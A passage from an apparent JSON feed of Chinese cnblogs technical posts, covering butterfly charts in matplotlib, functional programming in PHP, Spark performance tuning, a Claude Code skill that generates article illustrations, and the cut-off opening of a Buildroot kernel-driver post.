堆积条形图的困境</h1>\n<p><strong>堆积条形图</strong>就像一道精心摆盘的多层蛋糕，当层数不多时，我们能轻松分辨每层的高度差异。</p>\n<p>但当蛋糕层数超过4层，要比较某一特定口味在多个蛋糕中的含量就变得异常困难。</p>\n<p>下面我们用<code>Python</code>模拟一个常见的堆积条形图场景：调查某产品5个功能模块的用户满意度（5个维度），共收集了4个季度的数据。</p>\n<pre><code class=\"language-python\"># 模拟数据：4个季度，5个满意度维度（强烈反对、反对、中立、同意、坚决同意）\nquarters = [\"第一季度\", \"第二季度\", \"第三季度\", \"第四季度\"]\ncategories = [\"强烈反对\", \"反对\", \"中立\", \"同意\", \"坚决同意\"]\ncolors = [\"#FF6B6B\", \"#FF9F6B\", \"#D6CBCB\", \"#6BCF7F\", \"#4D96FF\"]\n\n# 每个季度的满意度分布（百分比）\ndata = np.array(\n    [\n        [5, 10, 25, 40, 20],  # 第一季度\n        [3, 8, 20, 45, 24],  # 第二季度\n        [4, 12, 18, 43, 23],  # 第三季度\n        [2, 6, 15, 50, 27],  # 第四季度\n    ]\n)\n\n# 传统横向堆积条形图\nfig, ax = plt.subplots(1, 2, figsize=(14, 4), gridspec_kw={\"width_ratios\": [1, 1]})\n\n# 左图：传统横向堆积条形图\n# ... 省略 ...\n\n# 右图：横向堆叠条形图的改进版，添加分隔线\n# ... 省略 ...\n\nplt.tight_layout()\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152231940-1462391798.png\" /></p>\n<p>这个横向堆积条形图展示了每个季度用户满意度的完整分布，随便右边的图稍微做了一些改进，</p>\n<p>但如果我们想回答以下问题就会遇到困难：</p>\n<ul>\n<li><strong>\"坚决同意\"</strong> 的比例在哪个季度最高？</li>\n<li><strong>\"反对\"</strong> 和 <strong>\"强烈反对\"</strong> 的比例如何随时间变化？</li>\n</ul>\n<h1 id=\"2-拆解重构--多个子图\">2. 拆解重构--多个子图</h1>\n<p>与其把所有食材炖在一锅里，不如将它们分盘摆放。</p>\n<p>我们将<strong>堆积条形图</strong>拆解为5个小图，每个小图只关注一个满意度维度的季度变化。</p>\n<pre><code class=\"language-python\">import matplotlib.gridspec as gridspec\n\nfig = plt.figure(figsize=(12, 6))\ngs = gridspec.GridSpec(2, 5, figure=fig, hspace=0.3, wspace=0.4)\n# 拆解堆积条形图：为每个类别创建单独的横向子图\naxes = []\nfor i in range(5):\n    axes.append(fig.add_subplot(gs[0, i]))\n\n# 为每个满意度维度创建一个横向条形图\nfor i, (category, color, ax) in enumerate(zip(categories, colors, axes)):\n    # ... 省略 ...\n\nax = fig.add_subplot(gs[1, :]) # 第1行，所有列 (等同于 gs[1, 0:5])\n# ... 省略 ...\n\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232008-1859050466.png\" /></p>\n<p>拆解后的图表确实提升了单一维度的对比效果，但仍有一个明显问题：我们的视线需要在多个图表间来回跳跃，无法形成统一的视觉印象。</p>\n<p>这就像阅读一本分散在多个页面的表格，需要不断翻页对照。</p>\n<h1 id=\"3-双向对比--蝴蝶图\">3. 双向对比--蝴蝶图</h1>\n<p><strong>蝴蝶图</strong>（也称为人口金字塔图或双向条形图）是数据可视化的\"瑞士军刀\"，特别适合展示对立或双向比较的数据。</p>\n<p>它的设计哲学是：让对比在中心轴两侧自然展开，就像蝴蝶展开双翅。</p>\n<pre><code class=\"language-python\"># 4. 创建画布\nfig, ax = plt.subplots(2, 1,figsize=(10, 6))\ny_pos = np.arange(len(quarters))\n# 拆分数据列\nstrongly_disagree = data[:, 0]\ndisagree          = data[:, 1]\nneutral           = data[:, 2]\nagree             = data[:, 3]\nstrongly_agree    = data[:, 4]\n\n# ==========================================\n# 核心逻辑修改：以中立(Neutral)的中心为0点\n# ==========================================\n# 1. 绘制中立 (灰色)：跨越 0 轴\n# left 从 -width/2 开始，这样 0 就在正中间\n\n# 2. 绘制左侧 (负面情绪)：向左堆叠\n# 反对 (Green)：起始位置在 -neutral/2 的左边\n\n# 强烈反对 (Purple)：起始位置在 反对 的左边\n\n# 3. 绘制右侧 (正面情绪)：向右堆叠\n# 同意 (Orange)：起始位置在 neutral/2\n\n# 强烈同意 (Red)：起始位置在 同意 的右边\n\n# 5. 美化图表\n# 添加中间的基准线 (穿过中立条形)\n# ... 省略 ...\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232037-237677572.png\" /></p>\n<p><strong>蝴蝶图</strong>和一般的堆积条形图放在一起，可以明显看出两者在数据展示逻辑和视觉重心上有显著区别。</p>\n<p><strong>蝴蝶图</strong>侧重于展示 <strong>“对立态度的对比”</strong>，适合看正反两面的力量悬殊以及整体的情绪倾向，而且也便于比较同侧的数据。</p>\n<h1 id=\"4-总结\">4. 总结</h1>\n<p>总之，<strong>堆积条形图</strong>像一锅大杂烩，当食材（数据维度）过多时，我们很难品尝（分析）到每种食材的原味。</p>\n<p>通过拆解和重构，我们获得了更清晰的视角。而蝴蝶图则像一位优雅的舞者，将对比数据以对称的方式展开，既保留了整体视野，又强化了局部对比。</p>\n<p>优秀的数据可视化不在于展示所有信息，而在于以最少的认知成本传达最多的洞察。</p>\n<p>下次当我们面对多维数据对比的挑战时，不妨试试横向蝴蝶图这把\"瑞士军刀\"，它可能会给你带来意想不到的清晰与美感。</p>\n<p>绘制文中图像的完整代码共享在：<a href=\"https://url11.ctfile.com/f/45455611-8606783265-a93d12?p=6872\" rel=\"noopener nofollow\" target=\"_blank\">优化堆积条形图.ipynb</a> (访问密码: 6872)</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 15:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/wang_yb\">wang_yb</a>&nbsp;\n阅读(<span id=\"post_view_count\">28</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2026 年 PHP 函数式编程 优势与实际应用",
      "link": "https://www.cnblogs.com/catchadmin/p/19497758",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19497758\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 08:26\">\n    <span>2026 年 PHP 函数式编程 优势与实际应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"2026-年-php-函数式编程-优势与实际应用\">2026 年 PHP 函数式编程 优势与实际应用</h1>\n<p>函数式编程（FP）已经存在几十年了，但近年来在实际开发中用得越来越多。这篇文章整理一下 FP 的核心概念和实际应用场景。</p>\n<h2 id=\"什么是函数式编程\">什么是函数式编程</h2>\n<p>在深入优势和应用之前，先快速回顾一下函数式编程是什么。</p>\n<p>函数式编程的核心是把计算当作数学函数的求值。它是一种声明式编程风格，描述的是\"要什么\"，而不是\"怎么做\"。在 FP 中，函数是一等公民，可以作为参数传递给其他函数，可以从函数返回，也可以赋值给变量。</p>\n<p>FP 的一个核心原则是不可变性——一旦给变量赋值，就不能再改变。这消除了副作用，让代码更可预测、更容易调试。另一个基本概念是纯函数，对于相同的输入总是产生相同的输出，不会修改任何外部状态。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/functional-programming-paradigms-2026\" rel=\"noopener nofollow\" target=\"_blank\">原文 2026 年 PHP 函数式编程 优势与实际应用</a></p>\n<h2 id=\"为什么开发者应该关注函数式编程\">为什么开发者应该关注函数式编程</h2>\n<h3 id=\"更简洁更易维护的代码\">更简洁、更易维护的代码</h3>\n<p>函数式编程鼓励编写模块化、易于理解的代码。因为函数是纯的（不修改状态），意外行为的空间更小，代码库更干净。这让调试、测试和后续修改都更容易。</p>\n<p>假设你在做一个 PHP 项目。使用函数式技术可以减少副作用，确保应用逻辑被隔离成更小的、可复用的代码片段。这也让后续更新或重构更容易，因为函数式代码的依赖通常更少。</p>\n<h3 id=\"并发和并行\">并发和并行</h3>\n<p>现代软件的一个挑战是处理并发和并行。随着多核处理器和分布式系统的普及，编写能高效处理多任务的代码比以往更重要。</p>\n<p>函数式编程在这方面有明显优势：因为函数避免修改共享状态，它们天生是线程安全的。这让编写并发应用更容易，不用担心竞态条件或死锁。</p>\n<p>比如一个需要处理大数据集的 PHP 应用。使用不可变数据结构和并行处理技术，可以确保应用的不同部分并发运行而不互相干扰。</p>\n<h3 id=\"更好的抽象和复用\">更好的抽象和复用</h3>\n<p>函数式编程促进高层抽象的创建。函数可以轻松组合、传递，在应用的不同部分复用。</p>\n<p>比如在 PHP 中，与其写重复的代码处理某些操作，不如写小的纯函数，然后灵活地组合起来。这减少了代码重复，更好地遵循 DRY（Don't Repeat Yourself）原则。</p>\n<h3 id=\"php-中的函数式工具\">PHP 中的函数式工具</h3>\n<p>PHP 不是纯函数式语言，但内置的 <code>array_map()</code>、<code>array_filter()</code>、<code>array_reduce()</code> 等函数提供了基本的函数式操作能力。第三方库如 Ramda、Lodash 也可以用。</p>\n<h2 id=\"函数式编程的核心原则\">函数式编程的核心原则</h2>\n<p>下面探讨函数式编程的一些核心原则，以及它们在实际编程中的应用。</p>\n<h3 id=\"不可变性\">不可变性</h3>\n<p>在函数式编程中，数据是不可变的。一旦设置了值，就不能改变。这个概念减少了与可变状态变化相关的 bug，简化了对程序行为的理解。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function addItemToList($list, $item) {\n    // 创建一个包含新元素的新列表\n    return array_merge($list, [$item]);\n}\n\n$list = [1, 2, 3];\n$newList = addItemToList($list, 4);\n\nprint_r($list);     // 输出: [1, 2, 3]（原列表不变）\nprint_r($newList);  // 输出: [1, 2, 3, 4]（包含新元素的新列表）\n</code></pre>\n<p>这个例子中，原始的 <code>$list</code> 保持不变，因为 PHP 数组是按值传递的。这展示了不可变性——原始数据结构被保留，返回的是包含新元素的新结构。</p>\n<h3 id=\"纯函数\">纯函数</h3>\n<p>纯函数对于相同的输入总是产生相同的输出，不会产生任何副作用。这让纯函数可预测且易于测试。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function square($number) {\n    return $number * $number;\n}\n\necho square(4); // 输出: 16\n</code></pre>\n<p><code>square()</code> 函数是纯的，因为对于相同的输入（4）总是产生相同的输出（16），而且不修改任何外部状态。</p>\n<h3 id=\"高阶函数\">高阶函数</h3>\n<p>高阶函数是可以接受其他函数作为参数或返回函数的函数。这实现了强大的抽象和代码复用。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function applyFunction($func, $value) {\n    return $func($value);\n}\n\nfunction double($x) {\n    return $x * 2;\n}\n\necho applyFunction('double', 5); // 输出: 10\n</code></pre>\n<p>这个例子中，<code>applyFunction()</code> 是一个高阶函数，因为它接受另一个函数（<code>double()</code>）作为参数并应用到一个值上。</p>\n<h3 id=\"函数组合\">函数组合</h3>\n<p>函数组合是把简单函数组合成更复杂函数的过程。这让你可以从更小的、可复用的组件构建复杂行为。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function add($x, $y) {\n    return $x + $y;\n}\n\nfunction multiply($x, $y) {\n    return $x * $y;\n}\n\nfunction addThenMultiply($x, $y, $z) {\n    return multiply(add($x, $y), $z);\n}\n\necho addThenMultiply(2, 3, 4); // 输出: 20（add(2, 3) = 5, multiply(5, 4) = 20）\n</code></pre>\n<p>这里，<code>addThenMultiply()</code> 函数展示了如何把更小的函数组合起来创建新功能。这鼓励代码复用和模块化。</p>\n<h2 id=\"函数式编程的实际应用\">函数式编程的实际应用</h2>\n<p>函数式编程不只是理论概念——它正在实际应用中使用。下面看看函数式编程在不同领域的一些实际例子。</p>\n<h3 id=\"数据转换和-etl-流程\">数据转换和 ETL 流程</h3>\n<p>在数据密集型应用中，比如数据转换或 ETL（Extract, Transform, Load）流程，函数式编程表现出色。它让开发者可以不可变地操作大数据集，使用高层抽象进行转换。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">$data = [1, 2, 3, 4, 5];\n\n// 使用函数式方法处理数据\n$result = array_map(fn($x) =&gt; $x * 2, $data);  // 每个值翻倍\n$result = array_filter($result, fn($x) =&gt; $x &gt; 5); // 只保留大于 5 的值\n\nprint_r($result);  // 输出: [6, 8, 10]\n</code></pre>\n<p>这个例子中，我们使用 <code>array_map()</code> 和 <code>array_filter()</code> 不可变地转换和过滤数据集，这是函数式编程中的常见模式。</p>\n<h3 id=\"分布式系统中的并发\">分布式系统中的并发</h3>\n<p>函数式编程对不可变性和纯函数的强调，使它成为并发和并行处理任务的理想选择。你可以放心地编写并发应用，不用担心竞态条件。</p>\n<p>比如，在 PHP 中构建一个并发处理用户请求的分布式系统时，可以确保数据完整性，而不会引入与可变共享状态相关的 bug。</p>\n<h3 id=\"构建-api-端点和微服务\">构建 API 端点和微服务</h3>\n<p>构建微服务或 API 时，函数式编程可以帮助创建简洁、易维护的端点。通过确保每个函数处理特定任务且是纯的、确定性的，可以让每个微服务更容易测试和扩展。</p>\n<h2 id=\"小结\">小结</h2>\n<p>函数式编程的核心是不可变性、纯函数和高阶函数。这些概念在并发处理、数据转换等场景下比较实用。PHP 虽然不是纯函数式语言，但内置函数和第三方库已经提供了足够的支持。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 08:26</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">50</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大数据技术领域发展与Spark的性能优化",
      "link": "https://www.cnblogs.com/zzq6032010/p/19497421",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zzq6032010/p/19497421\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 23:59\">\n    <span>大数据技术领域发展与Spark的性能优化</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><strong><span style=\"font-size: 15px;\">一、大数据技术领域发展方向</span></strong></p>\n<p>随着AI时代的到来，大数据技术领域逐渐退居二线，再也没有了前些年的重视程度。博主近期结合从业多年经验，对大数据技术领域的技术演进路线做下梳理。</p>\n<p>当前大数据领域发展已经进入深水区，随着各种成熟大数据框架的应用普及，难点已经从存不下、算不出，变为了如何高质量、高效计算数据并增加数据与价值的转换率，这就涉及到针对价值变现场景的数据设计和全生命周期的管理。这部分根据具体业务场景的差异，设计实现千差万别，本文以Spark On Yarn经典大数据集群场景为例，讲一讲如何高效计算数据。</p>\n<p>&nbsp;</p>\n<p><strong><span style=\"font-size: 15px;\">二、Spark On Yarn性能优化思路</span></strong></p>\n<p><strong><span style=\"font-size: 14px;\">1、Spark调参</span></strong></p>\n<p>Spark开放了众多过程参数，来控制集群运行过程中各个维度的设置。常用来参数调优的有：</p>\n<p>spark.default.parallelism：并行度</p>\n<p>spark.sql.shuffle.partitions：shuffle分区数（常为集群Executor核心数的2-3倍）</p>\n<p>spark.executor.memoryOverhead：调节shuffle过程中内存溢出阈值</p>\n<p>spark.dynamicAllocation.enabled=true：启用动态资源分配，任务负载高时可自行增加对资源的申请</p>\n<p>spark.sql.adaptive.enabled=true：开启AQE，自动调节最优分区数，还可改善数据倾斜问题</p>\n<p>上面只是例举其中一小部分，参数调参配合SparkUI使用，方便观测调整效果。</p>\n<p><strong>2、代码端优化</strong></p>\n<p>手段很多，包括但不限于：增加缓存、减少udf的使用、走dataframe或sparksql最大化利用spark原生的引擎优化、使用broadcast等，核心原则是多利用spark优化机制，做好数据缓存。</p>\n<p><strong>3、数据端优化</strong></p>\n<p>数据端优化主要是两部分：</p>\n<p>第一是读取、存储时，采用高效存储格式，如parquet、ORC等，天然适配spark的分区计算模式，会减少很多无谓的操作。</p>\n<p>第二是采用高效序列化方式，减少shuffle过程中的序列化耗时，这部分时间可在SparkUI的Stage处查看task的timeline中的对应耗时。</p>\n<p><strong>4、架构层优化</strong></p>\n<p>上述措施都做完之后，基本就进入了性能优化的深水区，当前业界成熟做法有两大类，均能进一步突破数据计算瓶颈可带来较大幅度提升。</p>\n<p><span style=\"color: rgba(0, 0, 255, 1);\"><strong>第一是利用向量化技术，大幅提升计算效率。</strong></span></p>\n<p>向量化技术能有效果的基础，在于现代计算机对SIMD指令的支持。</p>\n<p>SIMD指令，即单指令流多数据流 Single Instruction Multiple Data，在计算机中可以使用一条指令，传递多个数据进去（即向量），而后CPU仅需对这一个向量进行一次运算（比如当前要进行加法运算），即可得到结果，相比传统CPU一个加法调用一次指令的方式，快了N（N为向量的长度）倍。</p>\n<p>所以向量化改造是一条理论上具备高效提效能力的技术方向。具体实操的话，开源组件推荐使用Gluten，小米技术团队去年做过实践分享，改造之后时间耗时平均降低30%。</p>\n<p><strong><span style=\"color: rgba(0, 0, 255, 1);\">第二是在并行计算路上继续狂奔，引入异构的GPU</span></strong>（注意不是NPU，NPU仅为支持AI训练推理加速，对通用数据计算增益效果并不好，且缺少配套）。</p>\n<p>在GPU计算提效这块，英伟达专门为Spark无缝使用开发了RAPIDS加速器插件。它可以以插件的方式集成到spark客户端中，通过参数开关指定启用。在spark的物理计划生成之后，会被该加速器插件拦截，将其中的CPU算子替换为GPU算子（若评估加速效果不好还可退回成CPU算子），而后在Task执行阶段，RAPIDS会接过该任务进行执行。</p>\n<p>大体，就这些了。单纯的大数据技术领域，可做的新技术演进已经不多了，后面更多的是如何精细化价值转换，给AI给行业赋能。</p>\n<p>后续将沿着AI的方向，进行博文的更新和学习。</p>\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-17 23:59</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zzq6032010\">淡墨痕</a>&nbsp;\n阅读(<span id=\"post_view_count\">66</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "我用 Claude Skills 做了个「文章自动配图」技能",
      "link": "https://www.cnblogs.com/gdutxiaoxu/p/19499145",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/gdutxiaoxu/p/19499145\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 21:13\">\n    <span>我用 Claude Skills 做了个「文章自动配图」技能</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"我用-claude-skills-做了个文章自动配图技能\">我用 Claude Skills 做了个「文章自动配图」技能</h1>\n<p>写公众号文章，你最烦什么？</p>\n<p>对我来说，是配图。</p>\n<p>每次写完文章，都要绞尽脑汁想配什么图、去哪里找图、怎么排版才好看。</p>\n<p>直到前几天，我用 Claude Code 做了个自动化技能，把这件事彻底解决了。</p>\n<p><img alt=\"image-20260118205002038\" class=\"lazyload\" /></p>\n<hr />\n<h2 id=\"一场景从重复劳动到一键搞定\">一、场景：从重复劳动到一键搞定</h2>\n<h3 id=\"以前的工作流\">以前的工作流</h3>\n<p>写完一篇技术文章后，如果要制作宣传图，你需要：</p>\n<ol>\n<li><strong>重新打开设计软件</strong>（Figma/Canva/Photoshop）</li>\n<li><strong>手动提炼文章要点</strong></li>\n<li><strong>逐张设计图片</strong></li>\n<li><strong>调整配色和排版</strong></li>\n<li><strong>导出PNG上传</strong></li>\n</ol>\n<p><strong>耗时：约 5-15 分钟（根据我的实际经验）</strong></p>\n<h3 id=\"现在的工作流\">现在的工作流</h3>\n<p>打开 Claude Code，输入一句话：</p>\n<pre><code>把这篇文章做成配图 mp-wechat/_published/xxx.md\n</code></pre>\n<p><strong>约 1分钟之后</strong>：打开生成的 HTML 文件，4张精美配图已经准备好，点击下载即可。</p>\n<p><strong>耗时：不到 2 分钟（包含打开文件下载的时间）</strong></p>\n<hr />\n<h2 id=\"二这个技能是如何实现的\">二、这个技能是如何实现的？</h2>\n<h3 id=\"第一步分析需求\">第一步：分析需求</h3>\n<p>我先思考了一个问题：<strong>\"文章转配图\"这个任务，可以拆解成哪些固定步骤？</strong></p>\n<pre><code>1. 读取文章内容\n2. 分析文章结构（标题、要点、金句、对比）\n3. 选择合适的图片模板\n4. 填充内容生成HTML\n5. 集成预览和下载功能\n</code></pre>\n<h3 id=\"第二步创建技能文件结构\">第二步：创建技能文件结构</h3>\n<pre><code>.claude/skills/article-to-promo-images/\n├── SKILL.md              # 技能入口（自动触发）\n├── core-logic.md         # 详细逻辑说明\n├── templates/\n│   └── base-template.html  # HTML模板\n└── examples/\n    └── sample-article.md   # 示例文章\n</code></pre>\n<h3 id=\"第三步编写-skillmd\">第三步：编写 SKILL.md</h3>\n<p>核心是告诉 Claude <strong>何时触发</strong>这个技能：</p>\n<pre><code class=\"language-markdown\">---\nname: article-to-promo-images\ndescription: 将文章自动转换为配图、海报、宣传图。分析文章内容，生成封面图、要点图、对比图、金句图等多种配图类型，支持自定义风格和主题色。\nlicense: MIT\n---\n\n# Article to Promo Images\n\n## 何时使用\n当用户请求将文章转换为配图、海报、宣传图时自动触发：\n\n- \"把这篇文章做成配图\"\n- \"为这篇教程生成配图\"\n- \"帮我制作文章封面图\"\n\n## 执行流程\n1. 读取并解析文章内容\n2. 智能分析选择模板组合\n3. 生成HTML文件\n4. 返回文件路径和使用说明\n</code></pre>\n<h3 id=\"第四步定义图片生成规则\">第四步：定义图片生成规则</h3>\n<p>不同类型的文章，生成不同的图片组合：</p>\n<pre><code class=\"language-javascript\">// 教程类文章\ntutorial: ['cover', 'roadmap', 'key-points', 'quote']\n\n// 技术类文章\ntechnical: ['cover', 'key-points', 'comparison', 'quote']\n\n// 观点类文章\nopinion: ['cover', 'quote', 'key-points']\n</code></pre>\n<hr />\n<h2 id=\"三实战效果展示\">三、实战效果展示</h2>\n<p>我用这个技能处理了一篇《Claude Code Skills 入门》文章，来看看效果：</p>\n<h3 id=\"生成的-3-张配图\">生成的 3 张配图</h3>\n<p><img alt=\"image-20260118205002038\" class=\"lazyload\" /></p>\n<ul>\n<li>主标题 + 副标题 + 系列标签</li>\n<li>核心价值标签：消除重复输入、减少Token重复输入、团队知识沉淀</li>\n</ul>\n<p><img alt=\"image-20260118205057739\" class=\"lazyload\" /></p>\n<ul>\n<li>左侧：传统提示词的痛点</li>\n<li>右侧：Claude Skills 的优势</li>\n<li>中间：转化箭头</li>\n</ul>\n<p><img alt=\"image-20260118205114614\" class=\"lazyload\" /></p>\n<ul>\n<li>金字塔三级加载机制</li>\n<li>L1 元数据（100 tokens）</li>\n<li>L2 SKILL.md（3000 tokens）</li>\n<li>L3 参考资源（按需加载）</li>\n</ul>\n<h3 id=\"设计风格\">设计风格</h3>\n<p>采用<strong>赛博科技风</strong>：</p>\n<ul>\n<li>深蓝渐变底色 + 霓虹青/橙红强调</li>\n<li>网格纹理 + 扫描线效果</li>\n<li>科技感字体（Orbitron + JetBrains Mono）</li>\n</ul>\n<hr />\n<h2 id=\"四技术实现细节\">四、技术实现细节</h2>\n<h3 id=\"1-内容提取算法\">1. 内容提取算法</h3>\n<pre><code class=\"language-javascript\">// 从 Markdown 中提取结构化信息\n{\n  title: \"一级标题\",\n  subtitle: \"首段摘要\",\n  keyPoints: [\"无序列表1\", \"无序列表2\"],\n  sections: [\"章节1\", \"章节2\"],\n  quotes: [\"引用块内容\"],\n  articleType: \"tutorial\"  // 自动判断\n}\n</code></pre>\n<h3 id=\"2-模板变量系统\">2. 模板变量系统</h3>\n<pre><code class=\"language-html\">&lt;!-- 使用占位符便于动态替换 --&gt;\n&lt;h1&gt;{{TITLE}}&lt;/h1&gt;\n&lt;p&gt;{{SUBTITLE}}&lt;/p&gt;\n&lt;div class=\"tags\"&gt;\n  {{#each tags}}\n    &lt;span class=\"tag\"&gt;{{this}}&lt;/span&gt;\n  {{/each}}\n&lt;/div&gt;\n</code></pre>\n<h3 id=\"3-国内-cdn-优化\">3. 国内 CDN 优化</h3>\n<pre><code class=\"language-html\">&lt;!-- 字体：使用国内CDN --&gt;\n&lt;link href=\"https://fonts.sourcegcdn.com/css2?family=...\" /&gt;\n\n&lt;!-- html2canvas：使用 bootCDN --&gt;\n&lt;script src=\"https://cdn.bootcdn.net/ajax/libs/html2canvas/1.4.1/html2canvas.min.js\"&gt;&lt;/script&gt;\n</code></pre>\n<hr />\n<h2 id=\"五使用这个技能的三种方式\">五、使用这个技能的三种方式</h2>\n<h3 id=\"方式一直接调用已配置技能\">方式一：直接调用（已配置技能）</h3>\n<pre><code>把这篇文章做成配图\n</code></pre>\n<h3 id=\"方式二指定参数\">方式二：指定参数</h3>\n<pre><code>生成 3 张配图，用极简风格\n</code></pre>\n<h3 id=\"方式三url-输入\">方式三：URL 输入</h3>\n<pre><code>把这个链接做成配图 https://example.com/article\n</code></pre>\n<hr />\n<h2 id=\"六这个技能的价值\">六、这个技能的价值</h2>\n<h3 id=\"对个人\">对个人</h3>\n<table>\n<thead>\n<tr>\n<th>维度</th>\n<th>提升</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>效率</strong></td>\n<td>从 20-30 分钟 → 1-2 分钟</td>\n</tr>\n<tr>\n<td><strong>质量</strong></td>\n<td>统一设计风格，专业感强</td>\n</tr>\n<tr>\n<td><strong>复用</strong></td>\n<td>一次配置，永久使用</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"对团队\">对团队</h3>\n<ul>\n<li><strong>统一品牌视觉</strong>：所有文章配图风格一致</li>\n<li><strong>降低协作成本</strong>：新人无需学习设计工具</li>\n<li><strong>知识沉淀</strong>：配图模板纳入版本控制</li>\n</ul>\n<hr />\n<h2 id=\"七进阶技巧\">七、进阶技巧</h2>\n<h3 id=\"技巧-1自定义主题色\">技巧 1：自定义主题色</h3>\n<p>修改模板中的 CSS 变量：</p>\n<pre><code class=\"language-css\">:root {\n  --primary: #00fff2;      /* 主色 */\n  --secondary: #ff6b35;    /* 强调色 */\n  --background: #0a0e17;   /* 背景色 */\n}\n</code></pre>\n<h3 id=\"技巧-2添加新图片类型\">技巧 2：添加新图片类型</h3>\n<p>在 <code>core-logic.md</code> 中定义新的提取规则，比如：</p>\n<pre><code class=\"language-markdown\">### 数据图表\n从文章中提取数字和统计数据，自动生成对比图表\n</code></pre>\n<h3 id=\"技巧-3批量处理\">技巧 3：批量处理</h3>\n<p>一次处理多篇文章：</p>\n<pre><code>批量处理 _published/ 目录下的所有文章\n</code></pre>\n<hr />\n<h2 id=\"八总结\">八、总结</h2>\n<p>这个技能我已经用了一段时间，实际感受是：</p>\n<p><strong>Claude Skills 的本质不是\"存储提示词\"，而是\"固化工作流\"。</strong></p>\n<p>以前我每次都要重新思考：</p>\n<ul>\n<li>\"怎么提取文章要点？\"</li>\n<li>\"用什么设计风格？\"</li>\n<li>\"字体和配色怎么搭配？\"</li>\n</ul>\n<p>现在这些决策逻辑全部封装在技能文件里，Claude 会自动按我设定的规则执行。</p>\n<p><strong>一次思考，永久复用</strong>——这就是 Skills 的价值。</p>\n<hr />\n<h2 id=\"下一步\">下一步</h2>\n<p>如果你想尝试这个技能：</p>\n<ol>\n<li><strong>创建技能目录</strong>：<code>.claude/skills/article-to-promo-images/</code></li>\n<li><strong>创建 SKILL.md</strong>：参考上文\"第三步\"的示例内容</li>\n<li><strong>重启 Claude Code</strong></li>\n<li><strong>输入指令</strong>：<code>把这篇文章做成配图</code></li>\n</ol>\n<blockquote>\n<p>完整的技能实现代码（含HTML模板），我放在公众号后台了。需要的话可以在公众号后台回复 <strong>skills</strong> 获取</p>\n</blockquote>\n<blockquote>\n<p><strong>有问题或建议？</strong> 欢迎在评论区留言！</p>\n</blockquote>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 21:13</span>&nbsp;\n<a href=\"https://www.cnblogs.com/gdutxiaoxu\">程序员徐公</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "编写一个Buildroot 内核驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19498842",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19498842\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 17:40\">\n    <span>编写一个Buildroot 内核驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-内核驱动\">编写一个Buildroot 内核驱动</h1>\n<blockquote>\n<p>PS:内核驱动只能在<strong>/kernel/drivers/</strong>目录下</p>\n</blockquote>\n<p><img alt=\"image-20260117082757215\" 